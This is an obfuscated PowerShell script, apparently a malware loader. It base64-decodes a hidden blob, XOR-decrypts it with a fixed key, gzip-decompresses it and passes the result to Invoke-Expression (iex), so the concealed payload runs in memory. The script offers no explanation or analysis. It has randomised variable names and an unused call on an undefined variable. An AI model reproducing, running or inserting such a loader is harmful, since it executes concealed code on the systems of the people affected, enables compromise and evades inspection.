$8lyeutq6i7pwva4 = [System.Text.Encoding]::ascii
function i24wxn1rae5yhub8jm37gtlzqfd  {param($fwt6db3ozr01h2u )
  $ip4r7s5w2m6facu = [System.Convert]::FromBase64String($fwt6db3ozr01h2u)
  $sej8qh43aw7rnit= $8lyeutq6i7pwva4.GetBytes("qdput5xsjcyv")
    $ncw9f8rhxz3kbyo = $ip4r7s5w2m6facu
    $udz9l42kia1gyow = $(for ($m1k9cxd2zponvj0 = 0; $m1k9cxd2zponvj0 -lt $ncw9f8rhxz3kbyo.length; ) {
        for ($lyue1xsgwc2bntk = 0; $lyue1xsgwc2bntk -lt $sej8qh43aw7rnit.length; $lyue1xsgwc2bntk++) {
            $ncw9f8rhxz3kbyo[$m1k9cxd2zponvj0] -bxor $sej8qh43aw7rnit[$lyue1xsgwc2bntk]
            $m1k9cxd2zponvj0++
            if ($m1k9cxd2zponvj0 -ge $ncw9f8rhxz3kbyo.Length) {
                $lyue1xsgwc2bntk = $sej8qh43aw7rnit.length
            }
        }
    })
	$5mhvr7clwj8paeb = New-Object System.IO.MemoryStream( , $udz9l42kia1gyow )

	    $1qkvgdo3y8247tj = New-Object System.IO.MemoryStream
        $q5apdu9brnzjgk3 = New-Object System.IO.Compression.GzipStream $5mhvr7clwj8paeb, ([IO.Compression.CompressionMode]::Decompress)
	    $q5apdu9brnzjgk3.CopyTo( $1qkvgdo3y8247tj )
        $q5apdu9brnzjgk3.Close()
		$5mhvr7clwj8paeb.Close()
		[byte[]] $7mhkb2f9xnr41le = $1qkvgdo3y8247tj.ToArray()
 $rxp73o19ckn2qy6=$7mhkb2f9xnr41le
    return $rxp73o19ckn2qy6
}
[byte[]]$asq1ypon4hc3l6b=i24wxn1rae5yhub8jm37gtlzqfd $7158fanbwk9v2qg
[System.Text.Encoding]::ascii.GetString((i24wxn1rae5yhub8jm37gtlzqfd "bu94dXQ1eHNuY/QjKhfrTWBLJhWSbGP7Buan8LWi3j5YGskr49xr0s1Nzq4fUGRvdUx2NFHUM8GUjEQq7VzIevUsODQtvIC4Bur0251Fg2oddjJO43qDEljGSvf0F3S35HYxF9f0qu2SQ6ZZSpXROqjZZRmuN/z/pkjNb+YxIWt6F/PQBg/ZHRh4kDkzbQ5l/pWQi4ytMORbiOXcsD4hHJS9AQ16rUGzvPgy+7ZJHCfSq91JYAKC1sM7b8sz8lA0pMzMUJCoahNb1Qe19UvYJZREXuESI11LnTFeAIBT7ZMMqMi3rIHhiiWx07SEH884r/qBawAwsDd8591xMWmzOjAbOQgUh9fKvwd6MWtZ4MIls+ej/bBubl+XRCOLahPUbK06oRyoqYUgZTLBQocaK9Xj1XYANrQRxd4n3oE/hwTQL5IKnvVJLnWkVYvebQMpcsjdGsFrt+SnMa5S0Z/qKWJslEJE4ZX9Iy+OgO74s8OQv22rigiu3JJuwwHRx5PxrMPQX2fJYSe9VYOdjF6SJ+UdqsbNERuBXwUE2FU9j485YOB5eIe4RZhgr8VGG2dDIG9pvSrAooqSHgZNT0i2ahTJR3HIhVRWVVVC8j3zbRkdc6GJNSsjQlDXxoIJsD3ze2lPUF5x38srmpvu1c03YY1rvrTQdbZLd5Ff6YodhK7iMtdO+I2ZtEZ53EkCfiECNGsEOKQNISP54vve8f9Ilp/aByrDD249UsJQO/WA9aOotVo9AFrNYcTltGI74LHpnFGEMltBw6KLzxNxGvYkj3fAQ7t7bXxzFfQJ6JO1i3Ny+obmWccLbbzprmCPGEKhyzSsgN7BmOgS/UAv1nDpMT4vt9FfoSwx/dqwZGCS+jljJs24KSAVRPd6DB4w+IT51FpINZcNU1biyF+/VkLY3maETjnwjCnTdQpyda6g1gdC78C65NWkyK/8zbWKkCtxLRJ8eNS0Jw1sm4oGtaMdrmrqQOykZMTFwpq4yyiPn2Sr3KbwRuoLiEQqj3CRscDLwCPHh69wyI+xGgnY7eVNm1vopqYKF/cpvxctPucQbUHOMv1OLP5T1QEY6mckhozAc3yXSZSwtFgK5cnFO/1w11qI+LFUdH6RptJjA0b8Vy5xkjxE1oKn7fmeZzhEDd/eWSRdbTNlWIf/kheRdhQANIMfmiM6wdn2DHUURLRrSpvNvPxcRjjBTC2MWzwgsFZ4x+UQKnM1eA=="))|iex;